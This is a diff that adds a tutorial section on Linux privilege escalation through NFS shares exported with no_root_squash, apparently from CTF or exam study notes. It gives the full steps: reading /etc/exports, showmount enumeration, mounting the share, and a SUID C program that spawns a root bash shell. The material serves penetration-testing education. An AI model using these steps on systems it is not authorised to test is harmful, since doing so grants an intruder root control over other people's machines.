@@ -265,3 +265,54 @@ $chmod +x thm
 
 Now if we run ```./test``` we get the root shell.
 
+## Privilege escalation with NFS
+
+Privilege escalation vectors are not confined to internal access. Shared folders and remote management interfaces such as SSH and Telnet can also help you gain root access on the target system. Some cases will also require using both vectors, e.g. finding a root SSH private key on the target system and connecting via SSH with root privileges instead of trying to increase current usre's privilege level.
+
+Another vector that is more relevant to CTFs and exams is a misconfigured network shell. This vector can sometimes be seen during penetration testing engagements when a network backup system is present.
+
+NFS (Network File Sharing) configuration is kept in the /etc/exports file. This file is created during the NFS server installation and can usually be read by users.
+
+```bash
+$cat /etc/exports
+```
+
+One of the outputlines is /backups *(rw,sync,insecure,no_root_squash,no_subrree_check) The critical element for this privilege escalation vector is the "no_root_squash" option you can see here. By default, NFS will change the root user to nfsnobody and strip any file from operating with root privileges. If the "no_root_squash" option is present on a writable share, we can create an executable with SUID bit set and run it on the target system.
+
+To enumerate mountable shares from our attacking machine we can use
+
+```bash
+$showmount -e target_ip
+```
+
+We will mount one of the "no_root_squash" shares to our machine and start building our executable.
+```bash
+$mkdir /tmp/norootsquashmount
+$mount -o rw target_ip:/backups /tmp/norootsquashmount
+```
+
+We will use the c program 
+
+```c
+int main() {
+    setgid(0);
+    setuid(0);
+    system("/bin/bash");
+    return 0;
+}
+```
+
+```bash
+#gcc nfs.c -o nfs -w
+#chmod +s nfs
+```
+
+Now back on the target system we can see that both nfs.c and nfs are present
+```bash
+$./nfs
+```
+
+We will have our root shell.
+
+## Capstone Project
+
